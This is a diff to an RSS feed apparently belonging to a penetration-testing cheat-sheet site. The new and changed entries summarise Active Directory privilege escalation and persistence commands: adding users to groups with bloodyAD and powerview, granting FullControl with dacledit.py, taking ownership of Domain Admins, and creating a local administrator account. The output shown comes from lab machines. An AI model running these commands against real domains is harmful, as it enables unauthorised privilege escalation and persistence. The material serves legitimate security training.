@@ -15,6 +15,13 @@
       <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 *Evil-WinRM* PS C:\programdata&amp;gt; . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force *Evil-WinRM* PS C:\programdata&amp;gt; $new_user_password = ConvertTo-SecureString &amp;#39;Test1234&amp;#39; -AsPlainText -Force 4.</description>
     </item>
     <item>
+      <title>AddMember</title>
+      <link>https://tldrbins.github.io/addmember/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addmember/</guid>
+      <description>Privesc #1: Add User to Group (From Linux) bloodyAD powerview.py 1. Add User to Group # With password bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; --dc-ip &amp;lt;DC_IP&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; # With Kerberos bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; --dc-ip &amp;lt;DC_IP&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; Ref: bloodyAD&#xA;1. Connect # With password sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; $ sudo ntpdate -s dc01.rebound.htb &amp;amp;&amp;amp; powerview &amp;#39;rebound.</description>
+    </item>
+    <item>
       <title>AddSelf</title>
       <link>https://tldrbins.github.io/addself/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -29,11 +36,18 @@
       <description>Abuse #1: Change target user password Linux Windows 1. Add Full Control to current user impacket bloodyAD&#xA;Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . Add Full Control to current user sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl -use-ldaps $ dacledit.py -k &amp;#39;rebound.htb/oorend:1GR8t@$$4u&amp;#39; -dc-ip 10.10.11.231 -principal oorend -target-dn &amp;#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&amp;#39; -inheritance -action write -rights FullControl -use-ldaps Impacket v0.</description>
     </item>
     <item>
+      <title>Persistence</title>
+      <link>https://tldrbins.github.io/persistence/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/persistence/</guid>
+      <description>Add local user # Create new user net user &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; /add PS C:\WINDOWS\system32&amp;gt; net user test Test1234!@ /add The command completed successfully. # Add user to admin group net localgroup Administrators &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; /add PS C:\WINDOWS\system32&amp;gt; net localgroup administrators test /add The command completed successfully. # Add user to remote desktop group net localgroup &amp;#34;Remote Desktop Users&amp;#34; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; /add PS C:\WINDOWS\system32&amp;gt; net localgroup &amp;#34;remote desktop users&amp;#34; test /add The command completed successfully.</description>
+    </item>
+    <item>
       <title>WriteOwner/Own</title>
       <link>https://tldrbins.github.io/writeowner/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/writeowner/</guid>
-      <description>Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria&amp;gt; . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; -OwnerIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; *Evil-WinRM* PS C:\Users\maria&amp;gt; Set-DomainObjectOwner -Identity &amp;#39;DOMAIN ADMINS&amp;#39; -OwnerIdentity &amp;#39;maria&amp;#39; Abuse #2 : Add user to the group Linux Windows 1. Add full control permission to the user over the group impacket bloodyAD&#xA;# Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install .</description>
+      <description>Abuse #1 : Change owner of the group Linux Windows # With password sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; Set-DomainObjectOwner -TargetIdentity &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; -PrincipalIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria&amp;gt; . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; -OwnerIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; *Evil-WinRM* PS C:\Users\maria&amp;gt; Set-DomainObjectOwner -Identity &amp;#39;DOMAIN ADMINS&amp;#39; -OwnerIdentity &amp;#39;maria&amp;#39; Abuse #2 : Add user to the group Linux Windows 1. Add full control permission to the user over the group impacket bloodyAD powerview.</description>
     </item>
   </channel>
 </rss>
